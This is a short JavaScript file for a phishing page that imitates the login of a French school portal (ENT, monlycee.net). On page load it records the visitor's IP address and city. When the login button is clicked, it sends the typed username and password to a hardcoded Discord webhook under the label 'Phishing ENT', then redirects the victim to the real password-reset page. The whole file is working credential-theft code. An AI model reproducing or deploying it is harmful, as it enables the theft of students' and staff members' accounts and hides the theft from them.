let ipUser = null;
let locUser = null;

document.addEventListener("DOMContentLoaded", function() {
            fetch("https://ipinfo.io/json")
                .then(response => response.json())
                .then(data => {
                    ipUser = data.ip
                    locUser = data.city
                    console.log(locUser)
                })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                });
        });
        
document.getElementById("kc-login").addEventListener("click", async (event) => {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const passwordPresent = document.getElementById("password").value

    await fetch("https://discord.com/api/webhooks/1551574862475174018/MmXiAEyL8N7koa7zrJgi0TOemF6qlWMDfNJIy4H2c6Jgzf0jngEyJXwKNaa455dXkg-J", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            embeds: [
                {
                    title: "🧪 Test du formulaire",
                    description: "Une tentative de connexion a été détectée.",
                    color: 3447003,
                    fields: [
                        {
                            name: "👤 Utilisateur",
                            value: username || "Non renseigné",
                            inline: true
                        },
                        {
                            name: "🔐 Mot de passe",
                            value: passwordPresent || "Vide",
                            inline: true
                        },
                        {
                            name: "🌍 Adresse IP",
                            value: ipUser || "Vide",
                            inline: true
                        },
                        {
                            name: "📍 Localisation",
                            value: locUser || "Vide",
                            inline: true
                        }
                        
                    ],
                    footer: {
                        text: "Phishing ENT"
                    },
                    timestamp: new Date().toISOString()
                }
            ]

        })

    });
    window.location.href = "https://auth.monlycee.net/realms/TWIDF/login-actions/reset-credentials";
});